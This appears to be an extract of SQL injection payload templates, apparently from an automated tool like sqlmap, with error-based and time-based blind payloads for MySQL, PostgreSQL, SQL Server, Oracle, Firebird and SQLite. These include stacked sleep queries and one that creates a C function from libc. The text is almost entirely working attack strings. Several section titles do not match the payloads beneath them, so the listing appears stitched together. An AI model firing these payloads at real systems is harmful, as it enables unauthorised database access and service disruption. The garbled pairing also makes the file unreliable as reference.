test.title: MySQL >= 5.0 AND error-based - WHERE clause
test.vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(%s),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)

request.payload: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)
AND [RANDNUM]=CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]' AS NUMERIC)

test.title: Microsoft SQL Server/Sybase AND error-based - WHERE clause

request.payload: AND [RANDNUM]=CONVERT(INT,('[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]'))

AND [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||'[DELIMITER_START]'||(REPLACE((SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL),' ','[SPACE_REPLACE]'))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)
AND [RANDNUM]=UTL_INADDR.GET_HOST_ADDRESS('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]')
AND [RANDNUM]=CTXSYS.DRITHSX.SN([RANDNUM],('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'))
AND [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END FROM RDB$DATABASE)||'[DELIMITER_STOP]')

test.title: Microsoft SQL Server/Sybase error-based - ORDER BY clause

request.payload: , (CONVERT(INT,('[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]')))
, (SELECT UPPER(XMLType(CHR(60)||'[DELIMITER_START]'||(REPLACE((SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL),' ','[SPACE_REPLACE]'))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)
; SELECT SLEEP([SLEEPTIME]);
; SELECT BENCHMARK(5000000, MD5('[SLEEPTIME]'));
; SELECT PG_SLEEP([SLEEPTIME]);
; SELECT [RANDNUM] WHERE EXISTS(SELECT * FROM GENERATE_SERIES(1, 10000000));
; CREATE OR REPLACE FUNCTION sleep(int) RETURNS int AS '/lib/libc.so.6', 'sleep' language 'C' STRICT; SELECT sleep([SLEEPTIME]);
; WAITFOR DELAY '0:0:[SLEEPTIME]';
; BEGIN DBMS_LOCK.SLEEP([SLEEPTIME]); END;
; EXEC DBMS_LOCK.SLEEP([SLEEPTIME].00);
; EXEC USER_LOCK.SLEEP([SLEEPTIME].00);
; SELECT LIKE('ABCDEFG', UPPER(HEX(RANDOMBLOB(10000000))));
; SELECT COUNT(*) FROM RDB$DATABASE AS T1, RDB$FIELDS AS T2, RDB$FUNCTIONS AS T3, RDB$TYPES AS T4, RDB$FORMATS AS T5, RDB$COLLATIONS AS T6;
AND SLEEP([SLEEPTIME])
AND BENCHMARK(5000000, MD5('[SLEEPTIME]'))
AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])

test.title: Oracle AND time-based blind (heavy query)
test.vector: AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM all_users t1, all_users t2, all_users t3, all_users t4, all_users t5) ELSE [RANDNUM] END)

request.payload: AND [RANDNUM]=(SELECT COUNT(*) FROM all_users t1, all_users t2, all_users t3, all_users t4, all_users t5)
AND EXISTS(SELECT * FROM GENERATE_SERIES(1, 10000000))

test.title: Microsoft SQL Server/Sybase AND time-based blind (heavy query)

request.payload: AND (SELECT count(*) FROM sysusers AS sys1, sysusers as sys2, sysusers as sys3, sysusers AS sys4, sysusers AS sys5, sysusers AS sys6, sysusers AS sys7, sysusers AS sys8)>0
AND LIKE('ABCDEFG', UPPER(HEX(RANDOMBLOB(10000000))))
AND (SELECT COUNT(*) FROM RDB$DATABASE AS T1, RDB$FIELDS AS T2, RDB$FUNCTIONS AS T3, RDB$TYPES AS T4, RDB$FORMATS AS T5, RDB$COLLATIONS AS T6) > 0
OR SLEEP([SLEEPTIME])=0
OR BENCHMARK(5000000, MD5('[SLEEPTIME]'))
OR [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])

test.title: Oracle OR time-based blind (heavy query)
test.vector: OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM all_users t1, all_users t2, all_users t3, all_users t4, all_users t5) ELSE [RANDNUM] END)

request.payload: OR [RANDNUM]=(SELECT COUNT(*) FROM all_users t1, all_users t2, all_users t3, all_users t4, all_users t5)
OR EXISTS(SELECT * FROM GENERATE_SERIES(1, 10000000))

test.title: Microsoft SQL Server/Sybase OR time-based blind (heavy query)

request.payload: OR (SELECT count(*) FROM sysusers AS sys1, sysusers as sys2, sysusers as sys3, sysusers AS sys4, sysusers AS sys5, sysusers AS sys6, sysusers AS sys7, sysusers AS sys8)>0
OR LIKE('ABCDEFG', UPPER(HEX(RANDOMBLOB(10000000))))
OR (SELECT COUNT(*) FROM RDB$DATABASE AS T1, RDB$FIELDS AS T2, RDB$FUNCTIONS AS T3, RDB$TYPES AS T4, RDB$FORMATS AS T5, RDB$COLLATIONS AS T6) > 0
